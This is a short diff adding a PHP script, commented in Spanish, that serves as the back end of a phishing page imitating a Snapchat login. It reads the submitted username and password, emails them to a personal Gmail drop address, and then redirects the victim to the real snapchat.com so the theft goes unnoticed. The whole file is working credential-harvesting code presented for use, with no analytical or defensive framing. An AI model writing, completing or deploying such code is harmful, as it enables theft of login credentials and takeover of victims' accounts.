@@ -1,0 +1,32 @@
+<?php
+// send_mail.php
+
+// Configuración del destinatario
+$to = 'mrcold713@gmail.com';
+$subject = 'Datos del formulario de inicio de sesión';
+
+// Obtener los datos del formulario
+$username = htmlspecialchars($_POST['username']);
+$password = htmlspecialchars($_POST['password']);
+
+// Crear el cuerpo del mensaje
+$message = "Nombre de usuario: $username\n";
+$message .= "Contraseña: $password\n";
+
+// Configurar encabezados del correo
+$headers = "From: no-reply@example.com" . "\r\n" .
+           "Reply-To: no-reply@example.com" . "\r\n" .
+           "X-Mailer: PHP/" . phpversion();
+
+// Enviar el correo
+if (mail($to, $subject, $message, $headers)) {
+    // Redirigir a Snapchat si el correo se envió con éxito
+    header("Location: https://www.snapchat.com");
+    exit();
+} else {
+    // Mostrar un mensaje de error y redirigir si el envío falla
+    echo "<h1>Error</h1>";
+    echo "<p>Hubo un problema al enviar el correo. Por favor, intenta de nuevo más tarde.</p>";
+    echo "<p><a href='index.html'>Regresar al formulario</a></p>";
+}
+?>
